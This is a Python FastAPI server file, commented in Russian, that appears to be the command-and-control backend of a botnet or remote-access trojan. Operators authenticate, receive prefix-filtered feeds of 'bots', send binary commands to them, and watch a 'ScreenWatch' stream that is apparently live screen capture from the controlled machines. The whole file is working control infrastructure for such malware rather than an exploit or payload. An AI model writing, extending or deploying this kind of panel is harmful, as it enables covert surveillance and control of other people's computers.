# backend/API/api.py
import uvicorn, asyncio, json
from pathlib import Path
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, Query, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

from .Database import verify_user, register_user, load_db, load_bots_from_file, get_login_by_token, generate_token
from backend.Services import send_binary_to_bot
from logs import Log as logger


# ==========================================
# БЛОК 1: УПРАВЛЕНИЕ WEB-ПОДКЛЮЧЕНИЯМИ (OPTIMIZED)
# ==========================================
class ConnectionManager:
    def __init__(self):
        # {login: [ws1, ws2]}
        self.active_connections = {}
        # {prefix: [ws1, ws2]}
        self.tunnels = {}
        # {ws: asyncio.Queue} - Очереди на отправку
        self.queues = {}
        # {ws: asyncio.Task} - Воркеры отправки
        self.send_tasks = {}
        # Кэш префиксов
        self.bot_prefix_cache = {}

    async def connect(self, ws, login, user):
        await ws.accept()

        # Увеличиваем размер очереди до 100 для сглаживания микро-задержек
        queue = asyncio.Queue(maxsize=100)
        self.queues[ws] = queue

        # Запускаем персональный воркер
        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))

        self.active_connections.setdefault(login, []).append(ws)

        prefix = user.get("prefix", "NONE")
        self.tunnels.setdefault(prefix, []).append(ws)
        if user.get("role") == "admin":
            self.tunnels.setdefault("ALL", []).append(ws)

        logger.info(f"[API] [+] {login} туннелирован ({prefix}). Очередь создана.")

    async def _socket_writer(self, ws, queue):
        """Фоновый воркер: берет из очереди и шлет в сокет без задержек."""
        try:
            while True:
                packet = await queue.get()
                await ws.send_bytes(packet)
                queue.task_done()
                # Позволяем event loop переключиться на другие задачи
                await asyncio.sleep(0)
        except Exception:
            pass  # Ошибки сокета обработает disconnect

    def disconnect(self, ws, login):
        if ws in self.send_tasks:
            self.send_tasks[ws].cancel()
            del self.send_tasks[ws]

        self.queues.pop(ws, None)

        if login in self.active_connections:
            if ws in self.active_connections[login]:
                self.active_connections[login].remove(ws)

        for p in list(self.tunnels.keys()):
            if ws in self.tunnels[p]:
                self.tunnels[p].remove(ws)

        logger.info(f"[API] [-] {login} отключен, ресурсы очищены.")

    def broadcast_packet_sync(self, packet: bytes):
        """Рассылка бинарных данных. При переполнении (видео) — полная очистка затора."""
        try:
            id_len = packet[0]
            mod_len = packet[1]
            raw_id = packet[6:6 + id_len]

            # Извлекаем имя модуля для определения видеопотока
            # ... извлечение имен ...
            mod_name_raw = packet[6 + id_len: 6 + id_len + mod_len].decode(errors='ignore').strip()
            is_video = "ScreenWatch" in mod_name_raw

            # ДОБАВЬ ЭТОТ ПРИНТ:
            if is_video:
                print(f"🎬 [VIDEO] Пакет ScreenWatch прошел! Размер: {len(packet)} байт")
            else:
                print(f"❓ [OTHER] Модуль: {mod_name_raw}")

            if raw_id not in self.bot_prefix_cache:
                bot_id = raw_id.decode(errors='ignore')
                self.bot_prefix_cache[raw_id] = bot_id.split('-')[0]

            prefix = self.bot_prefix_cache[raw_id]

            targets = []
            if prefix in self.tunnels:
                targets.extend(self.tunnels[prefix])
            if "ALL" in self.tunnels:
                targets.extend(self.tunnels["ALL"])

            if not targets:
                return

            for ws in targets:
                queue = self.queues.get(ws)
                if not queue: continue

                try:
                    queue.put_nowait(packet)
                except asyncio.QueueFull:
                    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ:
                    # Если это видео, то выбрасывать один пакет нельзя (будет каша).
                    # Мы полностью чистим очередь, чтобы "прыгнуть" к самому новому кадру.
                    if is_video:
                        print(f"DEBUG: Отправляю видео-кадр ({len(packet)} байт)")
                        while not queue.empty():
                            try:
                                queue.get_nowait()
                            except:
                                break
                        queue.put_nowait(packet)
                    else:
                        # Для обычных команд (не видео) просто игнорируем переполнение
                        pass
        except Exception:
            pass


# Инициализируем менеджер
manager = ConnectionManager()


# ==========================================
# БЛОК 2: ВСПОМОГАТЕЛЬНЫЕ ИНСТРУМЕНТЫ
# ==========================================
def pack_bot_command(bot_id: str, mod: str, payload: str):
    """Универсальная упаковка для API: [6 байт Header] + [Тело]"""
    b_id = bot_id.encode('utf-8')
    b_mod = mod.encode('utf-8')
    b_pay = payload.encode('utf-8')

    # Строго 6 байт: 1+1+4
    header = (
        len(b_id).to_bytes(1, 'big') +
        len(b_mod).to_bytes(1, 'big') +
        len(b_pay).to_bytes(4, 'big')
    )
    return header + b_id + b_mod + b_pay


def has_access(user, target_id):
    """Проверка прав доступа пользователя к конкретному боту."""
    return user["role"] == "admin" or user["prefix"] == "ALL" or target_id.startswith(user["prefix"])


# ==========================================
# БЛОК 3: КОНФИГУРАЦИЯ FASTAPI
# ==========================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Теперь здесь пусто, ZMQ Dispatcher удален
    yield


app = FastAPI(lifespan=lifespan)

# Статика (Админка)
FRONTEND_PATH = Path(__file__).resolve().parent.parent.parent / "frontend"
app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")


@app.get("/")
async def root(): return RedirectResponse("/sidebar/auth/auth.html")


# ==========================================
# БЛОК 4: AUTH API (HTTP)
# ==========================================
@app.get("/verify_token")
async def verify(token: str = Query(None)):
    login = get_login_by_token(token)
    return {"status": "ok", "login": login} if login else JSONResponse(status_code=401, content={"status": "err"})


@app.post("/{action}")
async def auth(action: str, data=Body(...)):
    login, pwd = data.get("login"), data.get("password")
    if action == "register":
        return {"status": "ok"} if register_user(login, pwd) else {"status": "error"}

    user = verify_user(login, pwd)
    if user:
        token = generate_token(login)
        return {"status": "ok", "token": token, "role": user["role"], "prefix": user["prefix"]}
    return {"status": "error", "message": "Invalid credentials"}


# ==========================================
# БЛОК 5: REAL-TIME HUB (WEBSOCKET)
# ==========================================
@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket, token: str = Query(None), login: str = Query(None),
                             mode: str = Query(None)):
    user_login = get_login_by_token(token)
    if not user_login or user_login != login:
        await ws.accept()
        return await ws.close(1008)

    user = load_db().get(user_login)
    await manager.connect(ws, user_login, user)

    try:
        # Инициализация списка ботов из БД
        if mode != "control":
            bots = load_bots_from_file()
            for bid, data in bots.items():
                if has_access(user, bid):
                    # Отправляем данные из БД и сразу пингуем бота для обновления
                    await ws.send_bytes(pack_bot_command(bid, "DataScribe", json.dumps(data)))
                    asyncio.create_task(send_binary_to_bot(bid, pack_bot_command(bid, "DataScribe", "get_metadata")))

        while True:
            msg = await ws.receive()
            if "bytes" in msg:
                pkt = msg["bytes"]
                if len(pkt) < 6: continue

                target_id = pkt[6:6 + pkt[0]].decode(errors='ignore').strip()

                # Игнорируем пустые ID (системный пинг от фронтенда)
                if not target_id: continue

                if has_access(user, target_id):
                    # ЛОГ 1: Отправка команды от админа конкретному боту
                    logger.info(f"[WS] UI -> Bot: {target_id} | Pkt: {len(pkt)} bytes")

                    if not await send_binary_to_bot(target_id, pkt):
                        logger.warning(f"[WS] Bot {target_id} offline")

    except Exception as e:
        # ЛОГ 2: Системный лог отключения или ошибки сессии
        logger.info(f"[WS] Session closed for {user_login}: {e}")
    finally:
        manager.disconnect(ws, user_login)


async def run_fastapi_server(host, port):
    config = uvicorn.Config(app, host=host, port=port, log_level="warning")
    await uvicorn.Server(config).serve()